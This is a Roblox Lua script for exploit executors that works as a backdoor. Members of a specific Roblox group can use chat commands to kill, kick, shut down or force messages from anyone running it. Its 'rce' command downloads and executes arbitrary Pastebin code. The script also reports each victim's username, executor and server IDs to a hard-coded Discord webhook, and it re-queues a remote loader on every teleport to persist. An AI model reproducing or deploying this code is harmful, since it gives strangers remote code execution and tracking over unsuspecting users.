repeat task.wait() until game:IsLoaded()
if _G.NLS == true then
	return
end
_G.NLS = true
function Notify(title,text)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = title;
		Text = text
	})
end
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Group = LocalPlayer:IsInGroup(11050125)
function SayMessage(String)
	if Group then
		print(String)
		return
	end
	local ChatBar = LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar
	ChatBar:CaptureFocus()
	ChatBar.Text = String
	ChatBar:ReleaseFocus(true)
end
--go away
local function getexploit()
	local exploit =
		(syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
		(isexecutorclosure and "Script-Ware V2") or
		(secure_load and "Sentinel") or
		(is_sirhurt_closure and "SirHurt V4") or
		(pebc_execute and "ProtoSmasher") or
		(KRNL_LOADED and "Krnl") or
		(WrapGlobal and "WeAreDevs") or
		(isvm and "Proxo") or
		(shadow_env and "Shadow") or
		(jit and "EasyExploits") or
		(getreg()['CalamariLuaEnv'] and "Calamari") or
		(unit and "Unit") or
		("Undetectable")
	return exploit
end

function Parse(Player)
	local PlayerGroup = Player:IsInGroup(11050125)
	if PlayerGroup == false or PlayerGroup == nil then
		return
	end
	Player.Chatted:Connect(function(Message)
		if Message:match("\\") then
			local Parsed = string.split(Message, "\\")
			if Parsed[1] == "kill" or Parsed[1] == "/e kill" then
				if string.match(LocalPlayer.Name:lower(), Parsed[2]:lower()) or Parsed[2] == "all" then
					pcall(function()
						LocalPlayer.Character:BreakJoints()
						LocalPlayer.Character:Destroy()
					end)
				end
			elseif Parsed[1] == "bring"or Parsed[1] == "/e bring" then
				if string.match(LocalPlayer.Name:lower(), Parsed[2]:lower()) or Parsed[2] == "all" then
					LocalPlayer.Character:PivotTo(Player.Character:GetPivot())
				end
			elseif Parsed[1] == "kick" or Parsed[1] == "/e kick"then
				if string.match(LocalPlayer.Name:lower(), Parsed[2]:lower()) or Parsed[2] == "all" then
					LocalPlayer:Kick(Parsed[3] or "我的狗突然出现了")
				end
			elseif Parsed[1] == "msgbox" or Parsed[1] == "/e msgbox"  then
				if string.match(LocalPlayer.Name:lower(), Parsed[2]:lower()) or Parsed[2] == "all" then
					if syn or KRNL_LOADED then
						messagebox(Parsed[3] or  "Hello from roblox RCE. :3", Parsed[4] or "Hello from roblox RCE. :3", 1)
					else
						Notify(Parsed[4] or "Hello from roblox RCE. :3", Parsed[3] or  "Hello from roblox RCE. :3")
					end					
				end
			elseif Parsed[1] == "stoprblx" or Parsed[1] == "/e stoprblx" then
				if string.match(LocalPlayer.Name:lower(), Parsed[2]:lower()) or Parsed[2] == "all" then
					game:Shutdown()
				end
			elseif Parsed[1] == "chat" or Parsed[1] == "/e chat" then
				if string.match(LocalPlayer.Name:lower(), Parsed[2]:lower()) or Parsed[2] == "all" then
					SayMessage(Parsed[3] or "uwu i am a furry owo")
				end
			elseif Parsed[1] == "rce" or Parsed[1] == "/e rce" then
				if string.match(LocalPlayer.Name:lower(), Parsed[2]:lower()) or Parsed[2] == "all" then
					loadstring(game:HttpGet("https://pastebin.com/raw/"..Parsed[3], true))()
				end
			elseif Parsed[1] == "spacefall"or Parsed[1] == "/e spacefall"  then
				if string.match(LocalPlayer.Name:lower(), Parsed[2]:lower()) or Parsed[2] == "all" then
					pcall(function()
						for i,v in ipairs(workspace:GetDescendants()) do
							if v:IsA("BasePart") then
								v:Destroy()
							end
						end
					end)
				end
			end
		end
	end)
end
task.spawn(function()
	pcall(function()
		if (syn and syn.request or http_request or http.request) then
			msg = {
				["content"] = nil,
				["embeds"] = {
					{
						["title"] = "https://www.roblox.com/games/"..game.PlaceId.."/"..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name:gsub(" ","-"),
						["description"] = "PlaceId: "..game.PlaceId.."\nJobid: "..game.JobId.."\n\n\nhttps://www.roblox.com/games/6307005312/Join-any-jobId-on-roblox",
						["color"] =  1959442,
						["author"] = {
							["name"] = "Infected Script Loaded in-game!"
						}
					}
				},
				["username"] = LocalPlayer.Name..", "..getexploit(),
				["avatar_url"] = "https://cdn.discordapp.com/attachments/934703753876094987/982497822567985172/angry.png",
				["attachments"] = {}
			}
			pcall(function()
				(syn and syn.request or http_request or http.request){
					Url = "https://discord.com/api/webhooks/982727926841761842/AMVemSlR41wrLRS4zHow9nhB8-CnwqCBlDFRH_d0J6--g84PUnoZGMRC_b_A17P-Yd93",
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/json"
					},
					Body = game:GetService("HttpService"):JSONEncode(msg)
				}
			end)
		end
	end)
end)
for i,v in ipairs(Players:GetPlayers()) do
	Parse(v)
end
Players.PlayerAdded:Connect(function(Player)
	Parse(Player)
end)

LocalPlayer.OnTeleport:Connect(function(State)
	if State == Enum.TeleportState.Started then
		pcall(function()
			local a = "loadstring(game:HttpGet('https://pastebin.com/raw/qA7n4jV0', true))()"
			syn.queue_on_teleport(a)
			queue_on_teleport(a)
		end)
	end
end)